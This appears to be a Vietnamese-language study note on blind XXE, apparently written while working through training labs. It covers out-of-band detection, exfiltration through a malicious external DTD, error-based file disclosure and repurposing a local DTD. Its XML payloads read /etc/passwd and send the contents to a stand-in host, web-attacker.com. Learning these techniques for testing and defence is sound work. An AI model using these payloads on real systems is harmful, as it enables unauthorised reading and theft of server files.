# Finding and exploiting blind XXE vulnerabilities.

## What is blind XXE?

- Các lỗ hổng Blind XXE phát sinh trong đó ứng dụng dễ bị tấn công bởi XXE nhưng không trả về kết quả trong các phản hồi. Điều này có nghĩa là không thể truy xuất trực tiếp các tệp phía máy chủ và do đó, Blind XXE thường khó khai thác hơn các lỗ hổng XXE thông thường.

- Có hai cách có thể tìm và khai thác các lỗ hổng XXE mù:

	+ Kích hoạt các tương tác mạng ngoài băng tần, đôi khi lọc dữ liệu nhạy cảm trong dữ liệu tương tác.
	+ Kích hoạt lỗi phân tích cú pháp XML theo cách mà các thông báo lỗi chứa dữ liệu nhạy cảm.

## Detecting blind XXE using out-of-band (OAST) techniques.

- Có thể phát hiện Blind XXE bằng cách sử dụng kỹ thuật tương tự như đối với các cuộc tấn công XXE SSRF nhưng kích hoạt tương tác mạng ngoài băng tần với hệ thống mà bạn kiểm soát. 

> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

- Cuộc tấn công XXE này khiến máy chủ thực hiện một yêu cầu HTTP back-end tới URL được chỉ định. Kẻ tấn công có thể theo dõi kết quả tra cứu DNS và yêu cầu HTTP, và do đó phát hiện ra rằng cuộc tấn công XXE đã thành công.

- Lab:
	+ Lab: Blind XXE with out-of-band interaction.[exploit](exploit/lab3.py)

- Đôi khi, các cuộc tấn công XXE sử dụng các thực thể thông thường bị chặn do một số xác thực đầu vào của ứng dụng hoặc một số quá trình phân tích cú pháp XML đang được sử dụng. 

- Trong trường hợp này, bạn có thể sử dụng các thực thể tham số XML để thay thế. Các thực thể tham số XML là một loại thực thể XML đặc biệt chỉ có thể được tham chiếu ở những nơi khác trong DTD. 

> <!ENTITY % myparameterentity "my parameter entity value" >
> %myparameterentity;

- Điều này có nghĩa là bạn có thể kiểm tra XXE mù bằng cách sử dụng tính năng phát hiện ngoài băng thông qua các thực thể tham số XML như sau:

> <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

- Payload XXE này khai báo một thực thể tham số XML được gọi xxe và sau đó sử dụng thực thể trong DTD. Điều này sẽ thực hiện tra cứu DNS và yêu cầu HTTP đến miền của kẻ tấn công, xác minh rằng cuộc tấn công đã thành công.

- Lab:
	+ Lab: Blind XXE with out-of-band interaction via XML parameter entities.[exploit](exploit/lab4.)

## Exploiting blind XXE to exfiltrate data out-of-band.

- Việc phát hiện lỗ hổng Blind XXE thông qua các kỹ thuật out-of-band không thực sự chứng minh được cách thức khai thác lỗ hổng. Những gì kẻ tấn công thực sự muốn đạt được là lấy sạch dữ liệu nhạy cảm. Điều này có thể đạt được thông qua lỗ hổng XXE mù, nhưng nó liên quan đến việc kẻ tấn công lưu trữ một DTD độc hại trên hệ thống mà chúng kiểm soát, sau đó gọi DTD bên ngoài từ bên trong tải trọng XXE trong băng tần.

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
- Xác định một thực thể tham số XML được gọi *file*, chứa nội dung của */etc/passwd*.
- Định nghĩa một thực thể tham số XML được gọi eval, chứa một khai báo động của một thực thể tham số XML khác được gọi exfiltrate. *exfiltrate* sẽ thực hiện một yêu cầu HTTP đến máy chủ web của kẻ tấn công có chứa giá trị của file thực thể trong chuỗi truy vấn URL.
- Sử dụng *eval* cho việc khai báo động của *exfiltrate* được thực hiện.
- Sử dụng *exfiltrate* để thực hiện yêu cầu URL được chỉ định.

- Sau cùng là lưu trữ payload tại web attack và tấn công XXE.

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

- Lab:
	+ Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD.[exploit](exploit/lab5.py)

## Exploiting blind XXE to retrieve data via error messages.

- Một cách tiếp cận thay thế để khai thác Blind XXE là kích hoạt lỗi phân tích cú pháp XML trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn truy xuất. Điều này sẽ có hiệu lực nếu ứng dụng trả về thông báo lỗi kết quả trong phản hồi của nó.

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- Xác định một thực thể *file*, chứa nội dung của */etc/passwd*.
- Định nghĩa một thực thể *eval*, chứa một khai báo động của một thực thể tham số XML khác được gọi là *error*. Thực thể *error* sẽ được đánh giá bằng cách truy một tệp không tồn tại có tên chứa giá trị của *file*.
- Sử dụng *eval* cho việc khai báo động của *error* được thực hiện.
- Sử dụng *error* để cố gắng tải tệp không tồn tại, dẫn đến thông báo lỗi chứa tên của tệp không tồn tại, là nội dung của */etc/passwd*.

- Lab:
	+ Lab: Exploiting blind XXE to retrieve data via error messages.[exploit](exploit/lab6.py)

## Exploiting blind XXE by repurposing a local DTD.

-  Khi sử dụng một thực thể tham số XML trong định nghĩa của một thực thể tham số khác, theo đặc tả XML, điều này được phép trong các DTD bên ngoài nhưng không được phép trong các DTD nội bộ.

- Khi các kết nối ngoài băng tần bị chặn vẫn có thể kích hoạt các thông báo lỗi chứa dữ liệu nhạy cảm do sơ hở trong đặc tả ngôn ngữ XML. Nếu DTD của tài liệu sử dụng kết hợp các khai báo DTD bên trong và bên ngoài, thì DTD nội bộ có thể xác định lại các thực thể được khai báo trong DTD bên ngoài. Khi điều này xảy ra, việc hạn chế sử dụng một thực thể tham số XML trong định nghĩa của một thực thể tham số khác có thể xảy ra.

- Điều này có nghĩa là kẻ tấn công có thể sử dụng kỹ thuật XXE dựa trên lỗi từ bên trong DTD nội bộ, miễn là thực thể tham số XML mà chúng sử dụng đang xác định lại một thực thể được khai báo bên trong DTD bên ngoài. Tất nhiên, nếu các kết nối ngoài băng tần bị chặn, thì DTD bên ngoài không thể được tải từ một vị trí từ xa. Thay vào đó, nó cần phải là một tệp DTD bên ngoài cục bộ cho máy chủ ứng dụng. Về cơ bản, cuộc tấn công liên quan đến việc gọi một tệp DTD tồn tại trên hệ thống tệp cục bộ và định vị lại nó để xác định lại một thực thể hiện có theo cách gây ra lỗi phân tích cú pháp chứa dữ liệu nhạy cảm.

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

- Xác định một thực thể *local_dtd*, chứa nội dung của tệp DTD bên ngoài tồn tại trên hệ thống tệp máy chủ.
- Định nghĩa thực thể *custom_entity*, thực thể này đã được xác định trong tệp DTD bên ngoài.Thực thể được xác định lại là chứa khai thác XXE dựa trên lỗi đã được mô tả, để kích hoạt thông báo lỗi chứa nội dung của */etc/passwd*.
- Sử dụng *local_dtd* để DTD bên ngoài được diễn giải, bao gồm cả giá trị được xác định lại của *custom_entity*.

### Locating an existing DTD file to repurpose.

- Vì cuộc tấn công XXE này liên quan đến việc định vị lại một DTD hiện có trên hệ thống tệp máy chủ, yêu cầu quan trọng là xác định vị trí tệp phù hợp. Vì ứng dụng trả về bất kỳ thông báo lỗi nào do trình phân tích cú pháp XML xuất ra, bạn có thể dễ dàng liệt kê các tệp DTD cục bộ chỉ bằng cách cố gắng tải chúng từ bên trong DTD nội bộ.

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

- Lab:
	+ Lab: Exploiting XXE to retrieve data by repurposing a local DTD.[exploit](exploit/lab7.py)